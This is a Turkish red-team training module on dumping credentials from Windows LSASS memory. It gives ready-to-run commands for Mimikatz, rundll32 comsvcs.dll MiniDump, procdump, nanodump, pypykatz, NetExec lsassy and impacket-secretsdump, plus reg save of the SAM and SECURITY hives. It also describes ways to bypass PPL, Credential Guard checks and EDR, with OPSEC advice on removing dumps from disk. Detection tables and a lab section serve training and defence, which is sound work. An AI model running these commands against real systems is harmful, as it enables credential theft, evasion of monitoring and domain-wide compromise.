## 1. Kavramsal Temel — Neden Var?

Windows, tek oturum açmayla (SSO) çalışabilmek için kullanıcı kimlik bilgilerini bir yerde **bellekte tutmak zorundadır** — her ağ kaynağına eriştiğinde parola sormaması için. Bu depo **LSASS (Local Security Authority Subsystem Service)** sürecidir:

> **LSASS bir makinede oturum açmış tüm kimliklerin sırlarını (NT hash, Kerberos biletleri, bazen düz parola) RAM'de tutar. Yerel admin/SYSTEM isen LSASS'ın belleğini okuyabilir veya dökümünü (dump) alabilirsin — içinden hash ve biletleri çıkarırsın. Bu, tek bir makineden birden çok kimlik çalmanın ana yoludur.**

Neden bu kadar değerli? Bir dosya sunucusuna veya jump host'a bir **domain admin** RDP ile bağlandıysa, onun kimliği o makinenin LSASS'ında kalır. O makinede yerel adminsen → DA'nın hash'i/bileti senindir → domain'in sonu.

**Analoji:** LSASS = otelin ana anahtar dolabı. Resepsiyona (SYSTEM) erişirsen, o an binada olan tüm misafirlerin oda anahtarlarının kopyaları oradadır.

## 2. Teknik Derinlik — LSASS İçinde Ne Var, Koruma Katmanları

### 2.1 LSASS içindeki sır türleri (SSP paketleri)

```
   LSASS
   ├── WDigest    → düz parola (Win8.1+ varsayılan KAPALI; UseLogonCredential=1 ile açılır!)
   ├── MSV1_0     → NT hash (her zaman var) → Pass-the-Hash
   ├── Kerberos   → TGT/TGS biletleri (.kirbi) → Pass-the-Ticket
   ├── LiveSSP / TsPkg / CredSSP → çeşitli oturum sırları
   └── DPAPI master key → [03.3]
```

> **WDigest hilesi:** Modern Windows'ta WDigest düz parolayı tutmaz. Ama registry'de `HKLM\SYSTEM\...\WDigest\UseLogonCredential = 1` yaparsan (admin gerekir) ve kurban yeniden oturum açarsa → düz parola tekrar bellekte belirir. Sabırlı saldırgan bunu ayarlar, bekler.

### 2.2 Koruma katmanları (ve neden dump'ı zorlaştırır)

| Koruma | Ne yapar | Bypass yaklaşımı |
|--------|----------|------------------|
| **RunAsPPL** (PPL) | LSASS'ı korumalı süreç yapar, sıradan admin okuyamaz | Mimikatz `!+ / !processprotect` (imzalı sürücü) veya PPLKiller/BYOVD |
| **Credential Guard** (VBS) | Sırları hipervizör-izole LSAIso'ya taşır | Bellekten çıkarılamaz → başka yöntem (keylog, DPAPI, roasting) |
| **EDR/ASR** | LSASS handle açılmasını izler/engeller | Doğrudan syscall, handle-çalma, dosya-yerine-bellek |

Credential Guard **açıksa** LSASS dump'ından NT hash/parola **çıkmaz** — bu, savunmanın en etkili tek kontrolüdür ([Blue 03.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md)).

### 2.3 Dump nasıl oluşur — `MiniDumpWriteDump` ve EDR gözü

Klasik dump `dbghelp!MiniDumpWriteDump` API'sini çağırır; bu, `lsass.exe`'ye bir **handle** açar (gerekli erişim: `PROCESS_VM_READ | PROCESS_QUERY_INFORMATION`) ve tüm bellek segmentlerini diske yazar.

```
   Saldırgan süreç ──OpenProcess(lsass, 0x1010)──▶ lsass.exe
                    ──MiniDumpWriteDump()────────▶ lsass.dmp (tüm heap)
        │                                              │
        ▼ EDR kancası (user-mode hook / kernel callback)
   Sysmon Event 10: SourceImage=... TargetImage=lsass.exe GrantedAccess=0x1010
```

> **EDR'ı atlatmanın üç ekseni:** (1) **erişim maskesini küçült** (nanodump minimal haklarla), (2) **handle'ı çal** (zaten lsass handle'ı açık bir sürecin — örn. antivirüsün — handle'ını `DuplicateHandle` ile ödünç al), (3) **doğrudan syscall** (ntdll'deki EDR user-mode hook'unu atlayıp `NtReadVirtualMemory`'yi doğrudan çağır — dumpert, SysWhispers). Her biri Sysmon 10'un GrantedAccess desenini veya API kancasını kırar.

### 2.4 LSASS'a hiç dokunmadan: SAM/SYSTEM ve NTDS

Bazı sırlar LSASS'ta değil, **registry hive'larında/diskte** durur — `SeBackupPrivilege` yeterli, LSASS handle gerekmez:

| Kaynak | İçerik | Yöntem |
|--------|--------|--------|
| SAM + SYSTEM hive | Yerel hesap NT hash'leri | `reg save`, offline secretsdump |
| SECURITY hive | LSA secrets, cached domain creds (DCC2) | secretsdump `-security` |
| `NTDS.dit` (DC) | **Tüm domain hash'leri** | VSS/`ntdsutil` → [Modül 09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/) |

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Mimikatz (klasik, en zengin)

```
:: LSASS'tan hash + bilet (yerel admin + debug priv gerekir)
privilege::debug
sekurlsa::logonpasswords          :: NT hash + (WDigest açıksa) düz parola
sekurlsa::ekeys                   :: Kerberos AES anahtarları (overpass-the-hash için)
sekurlsa::tickets /export         :: .kirbi biletleri diske (pass-the-ticket)
:: PPL varsa:
!+                                :: mimidrv sürücüsünü yükle
!processprotect /process:lsass.exe /remove
```

### 3.2 LOLBin dump (araçsız — comsvcs.dll)

```cmd
:: LSASS'ı yerleşik comsvcs.dll ile diske dump et (Mimikatz imzasından kaçınır)
tasklist /fi "imagename eq lsass.exe"          :: PID öğren (örn. 672)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full
```

```powershell
# PowerShell ile aynı (Out-Minidump / ProcDump)
procdump.exe -accepteula -ma lsass.exe lsass.dmp     # Sysinternals (imzalı → bazen AV atlar)
```

### 3.3 Dump'ı offline işle (hedef dışında — daha sessiz)

```bash
# lsass.dmp'i Kali'ye taşı, pypykatz ile çevrimdışı ayrıştır (hedefte Mimikatz çalıştırma)
pypykatz lsa minidump lsass.dmp
# → NT hash, Kerberos biletleri, WDigest çıktısı
```

### 3.4 Uzaktan (nxc / Impacket)

```bash
# NetExec — uzaktan LSASS dump (lsassy/nanodump/procdump metodları)
nxc smb 10.10.10.42 -u admin -p 'Pass!' --local-auth -M lsassy
nxc smb 10.10.10.42 -u admin -H <NThash> -M nanodump

# Impacket secretsdump — SAM + LSA secrets + cached creds (LSASS'a değil, hive'lara)
impacket-secretsdump corp.local/admin:'Pass!'@10.10.10.42
```

### 3.5 EDR-dayanıklı dump teknikleri

```
:: nanodump — minimal erişim maskesi + şifreli/geçersiz dump imzası (Sysmon 10'u zorlaştırır)
nanodump.exe --write C:\temp\lsass.dmp
:: dumpert — doğrudan syscall ile ntdll user-mode hook atlar
Outflank-Dumpert.exe
:: handle-çalma (zaten açık lsass handle'ı ödünç al)
:: (Cobalt Strike/ nanodump --fork / MalSeclogon teknikleri)
```

```cmd
:: SeBackupPrivilege ile hive kopyala (LSASS handle YOK → Sysmon 10 üretmez)
reg save HKLM\SAM   C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
:: offline: impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**Örnek pypykatz çıktısı:**
```
== LogonSession ==  DOMAIN\dadmin
  MSV   NT: 31d6cfe0d16ae931b73c59d7e0c089c0
  Kerberos  tgt: ... (dadmin@CORP.LOCAL)          ← Domain Admin bileti! → PtT
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| LSASS memory dump | **T1003.001** (LSASS Memory) | **Sysmon 10**: lsass.exe'ye `GrantedAccess 0x1010/0x1410` handle; comsvcs MiniDump | [Blue 03.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md) |
| comsvcs/rundll32 dump | T1003.001 | 4688: `rundll32 comsvcs.dll MiniDump`; disk'te `.dmp` | [Blue 01.3 — Sysmon](../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/01.3_Sysmon_ile_Derin_Telemetri.md) |
| secretsdump (uzaktan) | T1003.002/.004 (SAM/LSA) | 4624 Type 3 + servis oluşturma, remote registry | [Blue 04.3 — Uzak yürütme](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md) |

**OPSEC notları:**
- **Sysmon Event ID 10** (ProcessAccess → lsass.exe) LSASS dump'ının en güvenilir tespitidir. `GrantedAccess` maskesi (`0x1010`, `0x1410`, `0x143a`) klasik dump erişim haklarını ele verir. Bunu atlatmak için: handle-çalma (başka sürecin açık handle'ını kullan), doğrudan syscall (EDR user-mode hook atla), veya nanodump gibi minimal-erişim araçları.
- **Diske .dmp yazmak** ikinci IOC'dir (Sysmon 11 FileCreate). Bellek-içi ayrıştır veya dump'ı hemen dışarı taşı, diskte bırakma.
- **Credential Guard açıksa** dump boştur — enerjini boşa harcama. [02.4](../Modul_02_Ilk_Erisim_ve_Yerlesme/02.4_Ilk_Foothold_ve_Durum_Tespiti.md)'te CG durumunu sapta (`Seatbelt WindowsDefender`/`DeviceGuard`). CG varsa → DPAPI ([03.3](./03.3_DPAPI_ve_Credential_Vault.md)), roasting ([03.1](./03.1_Kerberoasting_ve_AS_REP_Roasting.md)) veya keylog yollarına dön.
- **Mimikatz binary'si** AV/EDR tarafından imza ile yakalanır. LOLBin (comsvcs) veya obfuscated/bellek-içi yükleme (`execute-assembly`) tercih et; ayrıştırmayı hedef dışında pypykatz ile yap.

## 5. Doğrulama / Lab

```powershell
# 1) Lab makinesine bir "domain admin" RDP ile bağlan (kimliğini LSASS'a bırak)
# 2) SYSTEM shell'de comsvcs ile dump al, pypykatz ile DA hash'ini çıkar
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsassPID> C:\temp\l.dmp full
# 3) Blue kontrolü: Sysmon Event 10'da lsass.exe hedefli GrantedAccess'i gör
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | ? Id -eq 10 | ? Message -match 'lsass'
# 4) RunAsPPL/Credential Guard aç → aynı dump'ın artık işe yaramadığını doğrula
```

Atomic Red Team: **T1003.001** (`Invoke-AtomicTest T1003.001`) comsvcs/procdump varyantları → Blue doğrulaması [Blue 03.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md).

### Gerçek-dünya hasat zinciri

```
   1) SYSTEM (Potato, 02.4) → tasklist /svc: sadece Defender, CG kapalı
   2) nanodump --write (minimal maske) → lsass.dmp → hemen dışarı taşı, disk'ten sil
   3) pypykatz lsa minidump lsass.dmp (Kali'de offline) → dadmin NT + TGT
   4) dadmin bileti → Pass-the-Ticket (Modül 04) veya NT → DCSync (Modül 09)
   CG açık olsaydı: 2-3 boş çıkardı → DPAPI (03.3) / roasting (03.1) yoluna dön
```
